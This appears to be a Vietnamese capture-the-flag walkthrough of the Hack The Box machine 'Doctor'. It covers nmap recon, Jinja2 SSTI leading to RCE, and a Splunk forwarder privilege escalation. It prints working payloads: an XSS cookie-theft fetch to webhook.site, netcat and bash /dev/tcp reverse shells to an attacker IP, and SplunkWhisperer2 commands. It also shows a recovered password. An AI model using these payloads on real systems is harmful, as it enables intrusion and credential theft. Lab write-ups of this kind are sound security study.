![image](https://hackmd.io/_uploads/BkX4G2koC.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/Doctor)

## Comment
Đây là một máy có lỗ hổng SSTI to RCE sau đó tiến hành leo quyền 

# Recon
## nmap 
Sau khi nmap ta scan được **3** port ssh và http 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.209       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 06:19 EDT
Nmap scan report for 10.10.10.209
Host is up (0.27s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.40 seconds
```
Từ đây, ta sẽ scan tiếp 3 port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80,8089 -sCV 10.10.10.209
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 06:22 EDT
Nmap scan report for 10.10.10.209
Host is up (0.27s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.28 seconds
```
## Port 80 - http
Khi truy cập vào ta có giao diện trang web

![image](https://hackmd.io/_uploads/Syayg8Jj0.png)

Các thao tác vào xem tính năng đều được trả về trang chính. Trang web được tiết lộ là có liên quan đến y tế và có tham chiếu đến doctors.htb nên ta sẽ cho nó vào địa chỉ ở `/etc/hosts`

![image](https://hackmd.io/_uploads/HkQpx8yoA.png)

Truy cập vào trang web nó mặc định sẽ kết nối đến http://doctors.htb/login?next=%2F

![image](https://hackmd.io/_uploads/H1x4b8yjC.png)

Sau khi thử SQLi không được nên sẽ đăng ký tài khoản xem có được không 

![image](https://hackmd.io/_uploads/BySaWLki0.png)

Sau khi đăng nhập ta được dẫn đến trang chính có 2 tính năng đăng post và update tài khoản

![image](https://hackmd.io/_uploads/rJ66J91iC.png)

![image](https://hackmd.io/_uploads/By16k9ysC.png)

## Port 8089 - Splunkd
![image](https://hackmd.io/_uploads/r1Slmp1jR.png)

Liên kết đầu tiên và thứ tư chỉ có nội dung “Invalid Request”. Liên kết thứ hai và thứ ba yêu cầu xác thực nhưng thử không được

Port 8089 của [Splunk](https://community.splunk.com/t5/Getting-Data-In/Can-someone-please-explain-to-me-why-Splunk-Universal-Forwarder/m-p/180067) là một cổng quản lý. Nó cho phép **admin** quản lý từ xa bộ forwarder. Khả năng nó sẽ có thể tận dụng để leo quyền

# User flag
## Exploit
### SSTI Vuln
Với bài post ta sẽ thử upload 1 vài payload xem web này có dính **XSS** không: 
```
<h1>alo</h1>

<<script>alert("XSS");//<</script>

onerror=alert`1`
```
Tuy nhiên thì nó không thực thi payload này. Check source để xem nó có bị encode không thì thấy được một đường dẫn đến nơi khác với nội dung là "archive vẫn đang trong quá trình thử nghiệm beta"

![image](https://hackmd.io/_uploads/ry9n7cyiC.png)

Path này truy cập, ta thấy có vẻ như là một trang trống. Tuy nhiên, khi xem nguồn trang thì thấy các post mà đã thêm vào và nằm trong các thẻ \<item> và \<title>. Ta sẽ có thể phá vỡ các tag này 

![image](https://hackmd.io/_uploads/SySWGo1oR.png)

```
</title><h1>alo</h1>
```
![image](https://hackmd.io/_uploads/H1cAfjko0.png)

Sau đó, chúng ta có thể đưa các thẻ tag mình vào và trang này đã thực thi. Điều này có nghĩa là web dính **XSS** hoặc **SSTI** để dẫn đến RCE

#### XSS
```
</title><script>fetch("https://webhook.site/ea508f50-5b1d-412a-8e4a-df451f8278d2/steal-cookie?c=" + document.cookie);</script>
```

Không nhận được phản hồi gì từ WebHook nên khả năng không có tương tác cả web
#### SSTI
Theo báo cáo của Wappalyze trang web sử dụng Flask của python nên nó sử dụng sử dụng Jinja2 template engine

![image](https://hackmd.io/_uploads/rJTadiyjR.png)

```
#Test
{{7*7}}

#RCE
</title>{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```
![image](https://hackmd.io/_uploads/B1-FtoksR.png)

![image](https://hackmd.io/_uploads/H1cTFikoR.png)

### Reverse shell 
Sau khi thử để có reverse shell ta có payload 
```
</title>{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('mkfifo /tmp/lol;nc 10.10.14.93 4444 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol').read() }}
```
![image](https://hackmd.io/_uploads/ByH-1nkjR.png)

Sau khi tìm xung quanh user flag lại không có ở user `home` hiện tại mà lại ở shaun
```
$ cd /home
$ ls
shaun
web
```
## Post-Exploit
### Lateral Movement
Ta có thể tận dụng **LinPeas** để tìm kiếm xem có gì để khai thác

Máy tấn công upload file lên
```
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8888
```
Máy mục tiêu tải về **LinPeas**
```
$ curl http://10.10.14.93:8888/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  842k  100  842k    0     0   275k      0  0:00:03  0:00:03 --:--:--  275k
$ ls
blog
blog.sh
linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```
Mật khẩu xuất hiện trong phần “Finding passwords inside logs”:

![image](https://hackmd.io/_uploads/rkXXohJoR.png)

Đây chính là log ghi lại yêu cầu POST cho chức năng đặt lại mật khẩu trên doctors.htb

Chuyển user và lấy đươc flag
```
$ $ $ $ $ su shaun
Password: Guitar123

whoami
shaun
cat /home/shaun/user.txt
fa2940016f639dc366af****
```
# Root flag
## Exploit
user shaun không thể sudo, LinPEAS không trả lại bất cứ điều gì đặc biệt. Tuy nhiên, khi recon ta nhân định rằng port 8089 có thể xem xét để leo quyền
```
find /* -name "splunk" 2>/dev/null
/etc/init.d/splunk
/opt/splunkforwarder/bin/splunk
/opt/splunkforwarder/share/splunk

cd /opt
ls
clean
splunkforwarder

cd splunkforwarder
ls
bin
copyright.txt
etc
include
lib
license-eula.txt
openssl
README-splunk.txt
share
splunkforwarder-8.0.5-a1a6394cc5ae-linux-2.6-x86_64-manifest
var
```
Ta biết được nó đang sử dụng splunkforwarder pb **8.0.5**. Search google

![image](https://hackmd.io/_uploads/HkGIJTJi0.png)

Ta có 1 trang khai thác lỗ hổng này tên là [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2): Leo thang đặc quyền cục bộ hoặc thực thi mã từ xa thông qua cấu hình sai của Splunk Universal Forwarder

Từ đây ta có file và dòng lệnh khai thác như sau:
```
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.93 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1'"
```
Leo quyền thành công!

![image](https://hackmd.io/_uploads/ryjBWTks0.png)

## Post-Exploit
```
root@doctor:/# cat /root/root.txt
cat /root/root.txt
ba4d735b103cbc2f0c13******
```
![image](https://hackmd.io/_uploads/HkD_XpJsA.png)

